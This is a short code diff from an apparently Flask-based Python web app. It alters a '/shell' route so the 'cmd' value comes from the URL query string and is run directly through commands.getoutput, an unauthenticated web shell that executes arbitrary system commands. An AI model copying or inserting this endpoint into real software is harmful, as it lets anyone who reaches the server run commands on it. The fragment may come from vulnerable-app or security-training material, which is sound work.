@@ -74,7 +74,7 @@ def logout():
 
 @app.route("/shell")
 def shell():
-    s = request.form['cmd']
+    s = request.args.get('cmd')
     return commands.getoutput(s)
 
 if __name__ == '__main__':
